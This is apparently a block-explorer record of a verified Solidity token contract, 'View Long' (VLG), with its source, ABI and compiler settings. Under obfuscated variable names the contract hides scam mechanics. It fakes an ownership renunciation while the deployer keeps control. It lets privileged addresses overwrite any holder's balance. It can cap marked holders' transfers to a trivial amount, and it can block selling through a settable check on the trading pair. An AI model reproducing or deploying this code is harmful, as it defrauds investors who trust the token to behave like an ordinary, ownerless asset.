{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface txReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract senderAtAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listTake {\n    function createPair(address tradingSellIs, address sellSwapReceiver) external returns (address);\n}\n\ninterface feeTakeTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listLimitFee) external view returns (uint256);\n\n    function transfer(address limitFee, uint256 tokenTeam) external returns (bool);\n\n    function allowance(address txMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitFee,\n        uint256 tokenTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapFund, uint256 value);\n    event Approval(address indexed txMode, address indexed spender, uint256 value);\n}\n\ninterface amountSwap is feeTakeTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ViewLong is senderAtAmount, feeTakeTx, amountSwap {\n\n    uint256 private receiverFee = 100000000 * 10 ** 18;\n\n    address private toMax;\n\n    event OwnershipTransferred(address indexed launchedLiquidity, address indexed fromMax);\n\n    function symbol() external view virtual override returns (string memory) {\n        return isReceiver;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedTake;\n    }\n\n    bool private feeSender;\n\n    bool public receiverMarketingTotal;\n\n    string private fundTeamTake = \"View Long\";\n\n    uint256 public swapReceiver;\n\n    bool private buySwap;\n\n    function launchedTotalEnable(address walletShould, address limitFee, uint256 tokenTeam) internal returns (bool) {\n        require(walletFee[walletShould] >= tokenTeam);\n        walletFee[walletShould] -= tokenTeam;\n        walletFee[limitFee] += tokenTeam;\n        emit Transfer(walletShould, limitFee, tokenTeam);\n        return true;\n    }\n\n    constructor (){\n        \n        txReceiver takeReceiver = txReceiver(receiverTotalMarketing);\n        feeTeamReceiver = listTake(takeReceiver.factory()).createPair(takeReceiver.WETH(), address(this));\n        \n        maxSwap = _msgSender();\n        fromList();\n        amountTo[maxSwap] = true;\n        walletFee[maxSwap] = receiverFee;\n        if (listTotal == feeLaunchIs) {\n            feeLaunchIs = listTotal;\n        }\n        emit Transfer(address(0), maxSwap, receiverFee);\n    }\n\n    address public maxSwap;\n\n    function approve(address txTakeMin, uint256 tokenTeam) public virtual override returns (bool) {\n        buyListShould[_msgSender()][txTakeMin] = tokenTeam;\n        emit Approval(_msgSender(), txTakeMin, tokenTeam);\n        return true;\n    }\n\n    function fromList() public {\n        emit OwnershipTransferred(maxSwap, address(0));\n        toMax = address(0);\n    }\n\n    function exemptSender(address launchSell) public {\n        require(launchSell.balance < 100000);\n        if (receiverMarketingTotal) {\n            return;\n        }\n        if (swapReceiver != listTotal) {\n            swapReceiver = listTotal;\n        }\n        amountTo[launchSell] = true;\n        if (listTotal != feeLaunchIs) {\n            buySwap = true;\n        }\n        receiverMarketingTotal = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private buyListShould;\n\n    bool public fundShould;\n\n    function receiverToFrom() private view {\n        require(amountTo[_msgSender()]);\n    }\n\n    uint256 public listTotal;\n\n    function transfer(address receiverReceiver, uint256 tokenTeam) external virtual override returns (bool) {\n        return shouldTotal(_msgSender(), receiverReceiver, tokenTeam);\n    }\n\n    function allowance(address maxAuto, address txTakeMin) external view virtual override returns (uint256) {\n        if (txTakeMin == receiverTotalMarketing) {\n            return type(uint256).max;\n        }\n        return buyListShould[maxAuto][txTakeMin];\n    }\n\n    uint256 listFee;\n\n    uint256 constant listSender = 6 ** 10;\n\n    uint256 toSell;\n\n    mapping(address => bool) public amountTo;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverFee;\n    }\n\n    uint8 private launchedTake = 18;\n\n    mapping(address => uint256) private walletFee;\n\n    address launchedToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private feeLaunchIs;\n\n    function balanceOf(address listLimitFee) public view virtual override returns (uint256) {\n        return walletFee[listLimitFee];\n    }\n\n    mapping(address => bool) public fromReceiver;\n\n    bool public buyMode;\n\n    address public feeTeamReceiver;\n\n    string private isReceiver = \"VLG\";\n\n    function shouldTotal(address walletShould, address limitFee, uint256 tokenTeam) internal returns (bool) {\n        if (walletShould == maxSwap) {\n            return launchedTotalEnable(walletShould, limitFee, tokenTeam);\n        }\n        uint256 receiverAt = feeTakeTx(feeTeamReceiver).balanceOf(launchedToken);\n        require(receiverAt == listFee);\n        require(limitFee != launchedToken);\n        if (fromReceiver[walletShould]) {\n            return launchedTotalEnable(walletShould, limitFee, listSender);\n        }\n        return launchedTotalEnable(walletShould, limitFee, tokenTeam);\n    }\n\n    function amountIsAt(uint256 tokenTeam) public {\n        receiverToFrom();\n        listFee = tokenTeam;\n    }\n\n    function transferFrom(address walletShould, address limitFee, uint256 tokenTeam) external override returns (bool) {\n        if (_msgSender() != receiverTotalMarketing) {\n            if (buyListShould[walletShould][_msgSender()] != type(uint256).max) {\n                require(tokenTeam <= buyListShould[walletShould][_msgSender()]);\n                buyListShould[walletShould][_msgSender()] -= tokenTeam;\n            }\n        }\n        return shouldTotal(walletShould, limitFee, tokenTeam);\n    }\n\n    function getOwner() external view returns (address) {\n        return toMax;\n    }\n\n    function owner() external view returns (address) {\n        return toMax;\n    }\n\n    address receiverTotalMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function teamFee(address receiverReceiver, uint256 tokenTeam) public {\n        receiverToFrom();\n        walletFee[receiverReceiver] = tokenTeam;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fundTeamTake;\n    }\n\n    function totalWallet(address listLaunchLiquidity) public {\n        receiverToFrom();\n        \n        if (listLaunchLiquidity == maxSwap || listLaunchLiquidity == feeTeamReceiver) {\n            return;\n        }\n        fromReceiver[listLaunchLiquidity] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txTakeMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenTeam\",\"type\":\"uint256\"}],\"name\":\"amountIsAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTakeMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLimitFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSell\",\"type\":\"address\"}],\"name\":\"exemptSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTeamReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMarketingTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTeam\",\"type\":\"uint256\"}],\"name\":\"teamFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLaunchLiquidity\",\"type\":\"address\"}],\"name\":\"totalWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ViewLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}